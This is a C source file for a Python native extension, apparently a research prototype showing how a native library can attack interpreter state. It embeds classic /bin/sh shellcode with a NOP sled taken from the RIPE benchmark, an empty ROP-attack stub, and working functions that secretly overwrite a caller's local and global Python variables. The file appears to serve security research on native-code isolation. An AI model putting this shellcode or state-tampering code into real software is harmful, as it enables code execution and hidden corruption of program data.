/**
 * Native extension module that attempts various different exploits
 * on Python interpreter stack frames.
 *
 *@author Marcela S. Melara
 */

#include <Python.h>
#include <frameobject.h>
#include <opcode.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

/*** Taken from RIPE ***/
/**
 * Shell code with simple NOP sled
 * @author Pontus Viking
 * @author Aleph One
 */
static char shellcode_simplenop[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

static size_t size_shellcode_simplenop = sizeof(shellcode_simplenop) / sizeof(shellcode_simplenop[0]) - 1; // Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library

static PyObject *rop_attack(PyObject *self, PyObject *args) {
  char stack_buffer[1024];
}

static PyObject * replace_print(PyObject *self, PyObject *args) {
    PyFrameObject *f = PyEval_GetFrame();
    Py_INCREF(f);

    PyFrame_FastToLocals(f);
    printf("[%s] Frame at %p with locals at %p\n", __func__, f, f->f_locals);
    // Replace the value of the local python variable p
    PyMapping_SetItemString(f->f_locals, "p", PyUnicode_FromString("pwned 5: Replaced the function param from a native lib"));

    // Merge it back with fast so the change persists
    PyFrame_LocalsToFast(f, 0);

    Py_DECREF(f);
    Py_INCREF(Py_None);
    return Py_None;
}

static PyObject * replace_global(PyObject *self, PyObject *args) {
    PyObject *globs;
    globs = PyEval_GetGlobals();

    // Replace the value of the global python variable y
    PyDict_SetItemString(globs, "y", PyLong_FromLong(5));

    printf("pwned 6: Used reflection to change the value of a Python global from a native lib: \n");

    Py_INCREF(Py_None);
    return Py_None;
}

static const char moduledocstring[] = "Attacks from native lib prototype";

PyMethodDef al_methods[] = {
    {"replace", (PyCFunction)replace_print, METH_VARARGS, "Replaces the value of the function arg with pwned"},
    {"replace_global", (PyCFunction)replace_global, METH_VARARGS, "Changes the value of the global variable"},
    {NULL, NULL, 0, NULL}
};

PyMODINIT_FUNC
initattacklib_native(void) {
    PyObject *mod = Py_InitModule("attacklib_native", al_methods);

    if (mod == NULL)
        return;
}
